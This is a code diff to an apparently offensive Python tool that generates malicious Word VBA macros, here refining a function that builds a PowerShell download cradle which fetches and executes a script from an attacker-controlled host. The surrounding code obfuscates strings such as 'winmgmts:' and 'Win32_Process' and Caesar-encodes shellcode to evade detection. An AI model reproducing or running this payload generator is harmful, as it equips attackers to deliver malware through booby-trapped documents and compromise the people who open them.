@@ -41,6 +41,10 @@ def generateMacroPayloadWithPS(lhost, srv_port, arch):
     # function body
     print(colored("[+] Generating VBA exploit with PS download cradle", 'green'))
 
+    if (arch == "x86"):
+        print(colored("    [!]", 'red')  + colored(" VBA starts x64 PowerShell. Create x64 exploit!", 'yellow'))
+        return
+
     # select the PS file
     # Getting the current work directory (cwd)
     out_dir = os.getcwd() + f"/output/{arch}"
@@ -66,7 +70,7 @@ def generateMacroPayloadWithPS(lhost, srv_port, arch):
 
 
         # file stored in Apache default directory and is accessible on port 80
-        payload = f"powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://{lhost}:{srv_port}/expl-{arch}-{ps_file}'))"
+        payload = f"powershell -exec bypass -nop -c iex \"(new-object system.net.webclient).downloadstring('http://{lhost}:{srv_port}/expl-{arch}-{ps_file}')\""
             
         ### payload encryption
         
@@ -74,6 +78,10 @@ def generateMacroPayloadWithPS(lhost, srv_port, arch):
         encPayload2 = encodeString("winmgmts:")
         encPayload3 = encodeString("Win32_Process")
         encDocName = encodeString("runner.doc")
+
+        print(colored(f"    [+] Payload: {payload}"))
+        print(colored(f"    [+] Doc name: runner.doc"))
+        
         
 
         ### encrypted payload
@@ -151,7 +159,7 @@ def generateMacroPayload(technique, shellcode, arch):
         counter = counter + 1
 
     shellcode_chars = list(filter(None, shellcode_chars))
-    print(shellcode_chars)
+    #print(shellcode_chars)
 
     # cesar encoding
     cesar_encoded_shellcode_chars = []
